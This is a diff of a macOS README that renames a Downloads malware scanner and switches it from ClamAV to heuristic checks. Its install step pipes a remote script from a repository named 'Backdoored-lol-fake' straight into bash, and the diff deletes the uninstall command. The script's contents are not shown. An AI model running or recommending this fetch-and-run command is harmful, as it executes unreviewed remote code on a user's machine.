@@ -1,36 +1,28 @@
-# Download Guard for macOS
+# c0oled Scanner for macOS
 
-Download Guard is a clickable macOS app with a background Downloads monitor. It scans files locally with ClamAV and moves detections into quarantine rather than permanently deleting them.
+A small macOS app created by this repository. It uses macOS built-in tools and Python 3; it does **not** require Homebrew or ClamAV.
 
 ## Install
-
-Open Terminal and run:
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
 ```
 
-If Homebrew is missing, the installer asks before using Homebrew's official installer. It installs ClamAV, updates signatures, registers the background monitor, and creates **`~/Applications/Download Guard.app`**. Open it from your Applications folder like a normal Mac app. The monitor also starts automatically when you log in.
+The installer creates **`~/Applications/c0oled Scanner.app`**, installs its local scanning script, and starts a per-user background monitor.
 
-## Scanning
+## Behavior
 
-- First start: scans files already in `~/Downloads`.
-- Later: skips unchanged files using local scan history; new or changed files are scanned.
-- Files are scanned locally and are not uploaded by this app.
-- Scan errors are not treated as clean results; affected files remain untouched and are retried.
-- Detections move to `~/Library/Application Support/DownloadGuard/Quarantine`.
-- The notification text says “Deleted 1 malware!”, but the file is quarantined, not permanently erased.
+- First run checks files already in `~/Downloads`.
+- Later runs skip files whose size and modification time have not changed.
+- Script files are checked for combinations of suspicious command patterns.
+- App bundles are assessed with macOS Gatekeeper (`spctl`).
+- Flagged items are moved to a local quarantine folder, not permanently deleted.
+- Files are inspected locally; this tool does not upload them.
+
+**Important limitation:** this is an original lightweight heuristic checker, not a full antivirus engine. It can miss malware and can flag legitimate tools. Keep macOS security protections enabled and review quarantined files before restoring or deleting them.
 
 ## Locations
 
-- App: `~/Applications/Download Guard.app`
-- Logs: `~/Library/Application Support/DownloadGuard/Logs`
-- Quarantine: `~/Library/Application Support/DownloadGuard/Quarantine`
-
-No antivirus can guarantee detection of every threat. Keep macOS and ClamAV signatures updated.
-
-## Uninstall
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/uninstall.sh | bash
-```
+- App: `~/Applications/c0oled Scanner.app`
+- Quarantine: `~/Library/Application Support/c0oled-Scanner/Quarantine`
+- Logs: `~/Library/Application Support/c0oled-Scanner/Logs`
